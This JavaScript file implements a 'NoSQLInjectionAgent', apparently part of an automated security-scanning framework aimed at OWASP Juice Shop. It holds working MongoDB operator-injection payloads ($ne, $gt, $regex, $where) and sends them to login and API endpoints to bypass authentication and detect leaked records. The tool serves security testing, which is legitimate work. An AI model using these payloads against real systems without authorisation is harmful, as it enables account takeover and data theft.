/**
 * NoSQLInjectionAgent - NoSQL injection detection agent
 * 
 * Detects injection vulnerabilities in NoSQL databases (MongoDB, Redis, CouchDB, etc.)
 * Tests JSON-based injections, operator injections, and query manipulation.
 * 
 * CRITICAL FOR JUICE SHOP - Detects NoSQL injections that SQLmap misses.
 */

import { BaseAgent } from '../base-agent.js';
import { createEvidenceEvent, EVENT_TYPES } from '../../worldmodel/evidence-graph.js';
import { CLAIM_TYPES } from '../../epistemics/ledger.js';
import fetch from 'node-fetch';

export class NoSQLInjectionAgent extends BaseAgent {
    constructor(options = {}) {
        super('NoSQLInjectionAgent', options);

        this.inputs_schema = {
            type: 'object',
            required: ['target'],
            properties: {
                target: { type: 'string', description: 'Target URL' },
                injectionPoints: {
                    type: 'array',
                    description: 'Discovered injection points from ParameterDiscoveryAgent',
                    items: { type: 'object' }
                },
            },
        };

        this.outputs_schema = {
            type: 'object',
            properties: {
                vulnerabilities: { type: 'array', items: { type: 'object' } },
                tested_endpoints: { type: 'number' },
                confirmed_injections: { type: 'number' },
            },
        };

        this.requires = {
            evidence_kinds: ['parameter_discovered', 'injection_point_identified'],
            model_nodes: []
        };

        this.emits = {
            evidence_events: [
                'nosql_injection_detected',
                'nosql_injection_confirmed',
                EVENT_TYPES.VULNERABILITY_FOUND,
            ],
            model_updates: [],
            claims: [
                'nosql_injectable',
                'authentication_bypass_possible',
                'data_exfiltration_possible',
            ],
            artifacts: [],
        };

        this.default_budget = {
            max_time_ms: 240000, // 4 minutes
            max_network_requests: 150,
            max_tokens: 0,
            max_tool_invocations: 0,
        };

        // MongoDB operator injection payloads
        this.mongoOperators = [
            { name: '$ne', payload: '{"$ne": null}', description: 'Not equal - auth bypass' },
            { name: '$gt', payload: '{"$gt": ""}', description: 'Greater than - auth bypass' },
            { name: '$gte', payload: '{"$gte": ""}', description: 'Greater than or equal' },
            { name: '$lt', payload: '{"$lt": ""}', description: 'Less than' },
            { name: '$lte', payload: '{"$lte": ""}', description: 'Less than or equal' },
            { name: '$regex', payload: '{"$regex": ".*"}', description: 'Regex match all' },
            { name: '$where', payload: '{"$where": "1==1"}', description: 'JavaScript injection' },
            { name: '$nin', payload: '{"$nin": []}', description: 'Not in array' },
            { name: '$in', payload: '{"$in": ["admin", "test"]}', description: 'In array' },
        ];

        // JSON injection payloads for login endpoints
        this.authBypassPayloads = [
            { username: '{"$ne": null}', password: '{"$ne": null}' },
            { username: '{"$gt": ""}', password: '{"$gt": ""}' },
            { username: 'admin', password: '{"$ne": ""}' },
            { username: '{"$regex": ".*"}', password: '{"$regex": ".*"}' },
        ];

        // Query string NoSQL injection patterns
        this.queryInjectionPayloads = [
            'id[$ne]=null',
            'id[$gt]=',
            'id[$regex]=.*',
            'user[$ne]=null&pass[$ne]=null',
            'email[$regex]=.*',
        ];

        // Boolean-based detection patterns
        this.truePatterns = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '1',
        ];

        this.falsePatterns = [
            '{"$eq": null}',
            '{"$gt": "zzzzzzzzz"}',
            '{"$regex": "^$"}',
            '0',
        ];
    }

    async run(ctx, inputs) {
        const { target, injectionPoints = [] } = inputs;

        const results = {
            vulnerabilities: [],
            tested_endpoints: 0,
            confirmed_injections: 0,
        };

        this.setStatus('Testing for NoSQL injection...');

        // Phase 1: Test injection points from ParameterDiscoveryAgent
        if (injectionPoints.length > 0) {
            const vulns = await this.testInjectionPoints(ctx, injectionPoints, target);
            results.vulnerabilities.push(...vulns);
            results.tested_endpoints += injectionPoints.length;
        }

        // Phase 2: Test common auth endpoints for bypass
        const authVulns = await this.testAuthenticationBypass(ctx, target);
        results.vulnerabilities.push(...authVulns);

        // Phase 3: Test API endpoints with JSON injection
        const apiVulns = await this.testJSONInjection(ctx, target);
        results.vulnerabilities.push(...apiVulns);

        results.confirmed_injections = results.vulnerabilities.filter(v => v.confirmed).length;

        this.setStatus(`Found ${results.confirmed_injections} confirmed NoSQL injections`);

        return results;
    }

    /**
     * Test discovered injection points for NoSQL vulnerabilities
     */
    async testInjectionPoints(ctx, injectionPoints, target) {
        const vulnerabilities = [];

        // Filter for NoSQL-relevant points
        const nosqlPoints = injectionPoints.filter(p => 
            p.vulnerability_types?.includes('nosql_injection') ||
            p.location === 'query' ||
            p.parameter.toLowerCase().includes('id') ||
            p.parameter.toLowerCase().includes('user')
        );

        for (const point of nosqlPoints.slice(0, 20)) { // Test top 20
            const { endpoint, parameter, location } = point;

            // Test query string injection
            if (location === 'query') {
                const queryVuln = await this.testQueryStringInjection(
                    ctx,
                    endpoint,
                    parameter,
                    target
                );
                if (queryVuln) {
                    vulnerabilities.push(queryVuln);
                }
            }

            // Test JSON body injection
            const jsonVuln = await this.testJSONBodyInjection(
                ctx,
                endpoint,
                parameter,
                target
            );
            if (jsonVuln) {
                vulnerabilities.push(jsonVuln);
            }
        }

        return vulnerabilities;
    }

    /**
     * Test query string NoSQL injection
     */
    async testQueryStringInjection(ctx, endpoint, parameter, target) {
        const baseUrl = this.normalizeBaseUrl(target);
        const url = `${baseUrl}${endpoint}`;

        // Try operator injection in query string
        for (const payload of this.queryInjectionPayloads.slice(0, 5)) {
            ctx.recordNetworkRequest();

            try {
                const testUrl = payload.includes('=')
                    ? `${url}?${payload}`
                    : `${url}?${parameter}=${payload}`;

                const response = await fetch(testUrl, {
                    method: 'GET',
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
                    },
                    timeout: 10000,
                });

                const body = await response.text();

                // Check for successful injection indicators
                if (this.detectSuccessfulInjection(response, body)) {
                    ctx.emitEvidence(createEvidenceEvent({
                        source: this.name,
                        event_type: 'nosql_injection_detected',
                        target,
                        payload: {
                            endpoint,
                            parameter,
                            injection_type: 'query_string',
                            payload,
                            status: response.status,
                        },
                    }));

                    return {
                        endpoint,
                        parameter,
                        type: 'nosql_query_injection',
                        payload,
                        confirmed: true,
                        severity: 'high',
                        description: 'NoSQL operator injection in query parameter',
                    };
                }

            } catch (error) {
                continue;
            }
        }

        return null;
    }

    /**
     * Test JSON body NoSQL injection
     */
    async testJSONBodyInjection(ctx, endpoint, parameter, target) {
        const baseUrl = this.normalizeBaseUrl(target);
        const url = `${baseUrl}${endpoint}`;

        // Try MongoDB operator injection
        for (const operator of this.mongoOperators.slice(0, 5)) {
            ctx.recordNetworkRequest();

            try {
                const body = JSON.stringify({
                    [parameter]: JSON.parse(operator.payload)
                });

                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
                    },
                    body,
                    timeout: 10000,
                });

                const responseBody = await response.text();

                if (this.detectSuccessfulInjection(response, responseBody)) {
                    ctx.emitEvidence(createEvidenceEvent({
                        source: this.name,
                        event_type: 'nosql_injection_confirmed',
                        target,
                        payload: {
                            endpoint,
                            parameter,
                            injection_type: 'json_body',
                            operator: operator.name,
                            status: response.status,
                        },
                    }));

                    return {
                        endpoint,
                        parameter,
                        type: 'nosql_json_injection',
                        operator: operator.name,
                        description: operator.description,
                        confirmed: true,
                        severity: 'high',
                    };
                }

            } catch (error) {
                continue;
            }
        }

        return null;
    }

    /**
     * Test authentication bypass via NoSQL injection
     */
    async testAuthenticationBypass(ctx, target) {
        const vulnerabilities = [];
        const baseUrl = this.normalizeBaseUrl(target);

        // Common login endpoints
        const loginPaths = [
            '/api/login',
            '/api/auth/login',
            '/rest/user/login', // Juice Shop!
            '/login',
            '/api/v1/login',
        ];

        for (const path of loginPaths) {
            const url = `${baseUrl}${path}`;

            for (const payload of this.authBypassPayloads) {
                ctx.recordNetworkRequest();

                try {
                    // Test with NoSQL operators in username/password
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
                        },
                        body: JSON.stringify(payload),
                        timeout: 10000,
                    });

                    const body = await response.text();

                    // Success indicators for auth bypass
                    if (response.status === 200 || response.status === 201) {
                        // Check for token/session in response
                        if (this.detectAuthenticationSuccess(response, body)) {
                            ctx.emitEvidence(createEvidenceEvent({
                                source: this.name,
                                event_type: EVENT_TYPES.VULNERABILITY_FOUND,
                                target,
                                payload: {
                                    vulnerability_type: 'nosql_auth_bypass',
                                    endpoint: path,
                                    payload,
                                    severity: 'critical',
                                },
                            }));

                            ctx.emitClaim({
                                claim_type: 'authentication_bypass_possible',
                                subject: path,
                                predicate: { method: 'nosql_injection', payload },
                                base_rate: 0.5,
                            });

                            vulnerabilities.push({
                                endpoint: path,
                                type: 'nosql_authentication_bypass',
                                payload,
                                confirmed: true,
                                severity: 'critical',
                                description: 'Authentication bypass via NoSQL operator injection',
                                impact: 'Attacker can bypass authentication without valid credentials',
                            });

                            break; // Found vulnerability, move to next endpoint
                        }
                    }

                } catch (error) {
                    continue;
                }
            }
        }

        return vulnerabilities;
    }

    /**
     * Test JSON-based API endpoints
     */
    async testJSONInjection(ctx, target) {
        const vulnerabilities = [];
        const baseUrl = this.normalizeBaseUrl(target);

        // Common API patterns
        const apiPaths = [
            '/api/users',
            '/api/products',
            '/api/search',
            '/api/data',
            '/rest/products/search', // Juice Shop
        ];

        for (const path of apiPaths) {
            const url = `${baseUrl}${path}`;

            // Test with $ne operator
            ctx.recordNetworkRequest();

            try {
                const testPayload = { query: { '$ne': null } };
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(testPayload),
                    timeout: 10000,
                });

                if (response.ok) {
                    const body = await response.text();
                    
                    // Check if we got unexpected data (indicates injection worked)
                    if (this.detectDataLeakage(body)) {
                        ctx.emitEvidence(createEvidenceEvent({
                            source: this.name,
                            event_type: 'nosql_injection_confirmed',
                            target,
                            payload: {
                                endpoint: path,
                                injection_type: 'json_api',
                                operator: '$ne',
                            },
                        }));

                        vulnerabilities.push({
                            endpoint: path,
                            type: 'nosql_data_exfiltration',
                            operator: '$ne',
                            confirmed: true,
                            severity: 'high',
                            description: 'NoSQL injection allows data exfiltration',
                        });
                    }
                }

            } catch (error) {
                continue;
            }
        }

        return vulnerabilities;
    }

    /**
     * Detect successful injection based on response
     */
    detectSuccessfulInjection(response, body) {
        // Status code indicators
        if (response.status === 200 || response.status === 201) {
            // Look for success indicators in JSON response
            try {
                const json = JSON.parse(body);
                
                // Common success fields
                if (json.success === true || json.status === 'success' ||
                    json.authenticated === true || json.token || json.data) {
                    return true;
                }

                // Array response (data leak)
                if (Array.isArray(json) && json.length > 0) {
                    return true;
                }

            } catch (e) {
                // Not JSON
            }

            // HTML indicators
            if (body.includes('welcome') || body.includes('dashboard') ||
                body.includes('logout')) {
                return true;
            }
        }

        return false;
    }

    /**
     * Detect authentication success
     */
    detectAuthenticationSuccess(response, body) {
        try {
            const json = JSON.parse(body);
            
            // Check for authentication tokens
            if (json.token || json.access_token || json.jwt || 
                json.authentication || json.session_token) {
                return true;
            }

            // Check for user data (successful login)
            if (json.user || json.profile || json.account) {
                return true;
            }

            // Check success flag
            if (json.status === 'success' || json.authenticated === true) {
                return true;
            }

        } catch (e) {
            // Not JSON, check headers
        }

        // Check for Set-Cookie header (session created)
        const setCookie = response.headers.get('set-cookie');
        if (setCookie && (setCookie.includes('session') || 
            setCookie.includes('token') || setCookie.includes('auth'))) {
            return true;
        }

        return false;
    }

    /**
     * Detect data leakage in response
     */
    detectDataLeakage(body) {
        try {
            const json = JSON.parse(body);
            
            // Large array response indicates data dump
            if (Array.isArray(json) && json.length > 5) {
                return true;
            }

            // Object with multiple records
            if (json.data && Array.isArray(json.data) && json.data.length > 5) {
                return true;
            }

            // Check for sensitive field names
            const bodyStr = JSON.stringify(json).toLowerCase();
            if (bodyStr.includes('password') || bodyStr.includes('email') ||
                bodyStr.includes('username') || bodyStr.includes('token')) {
                return true;
            }

        } catch (e) {
            // Not JSON
        }

        return false;
    }

    /**
     * Boolean-based blind injection testing
     */
    async testBooleanBlindInjection(ctx, endpoint, parameter, target) {
        const baseUrl = this.normalizeBaseUrl(target);
        const url = `${baseUrl}${endpoint}`;

        // Test TRUE condition
        ctx.recordNetworkRequest();
        const trueResponse = await fetch(`${url}?${parameter}=${this.truePatterns[0]}`, {
            timeout: 10000
        });
        const trueBody = await trueResponse.text();
        const trueLength = trueBody.length;

        // Test FALSE condition
        ctx.recordNetworkRequest();
        const falseResponse = await fetch(`${url}?${parameter}=${this.falsePatterns[0]}`, {
            timeout: 10000
        });
        const falseBody = await falseResponse.text();
        const falseLength = falseBody.length;

        // If responses differ significantly, likely vulnerable
        if (Math.abs(trueLength - falseLength) > 100) {
            return {
                endpoint,
                parameter,
                type: 'nosql_boolean_blind',
                confirmed: true,
                severity: 'medium',
                description: 'Boolean-based blind NoSQL injection',
            };
        }

        return null;
    }

    // ========================================================================
    // HELPER METHODS
    // ========================================================================

    normalizeBaseUrl(url) {
        try {
            const parsed = new URL(url);
            return `${parsed.protocol}//${parsed.host}`;
        } catch {
            return url;
        }
    }
}

export default NoSQLInjectionAgent;
